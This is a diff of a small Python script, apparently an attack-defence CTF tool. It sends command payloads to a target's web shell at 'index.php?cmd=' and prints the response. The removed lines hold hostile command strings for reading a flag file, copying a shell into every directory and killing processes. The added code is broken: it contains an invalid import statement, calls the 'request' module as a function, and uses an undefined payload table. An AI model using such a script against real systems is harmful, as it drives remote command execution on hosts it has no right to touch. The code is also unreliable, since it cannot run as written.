@@ -1,8 +1,15 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+from config import *
+from sys_payload import all *
 
-get_flag = 'cat /home/ctf/flag;' #获取flag
-duplicate_shell = 'cp ;'         #复制shell到所有目录下
-kill_process = ';'               #杀掉进程
- 
+# example of payload
+import request
+
+def run(target,payload,extend):
+	target = target
+	payload = sys_payload[payload]
+	url = 'http://'+target+'/index.php?cmd='+payload
+	t = request(url)
+	return t.text
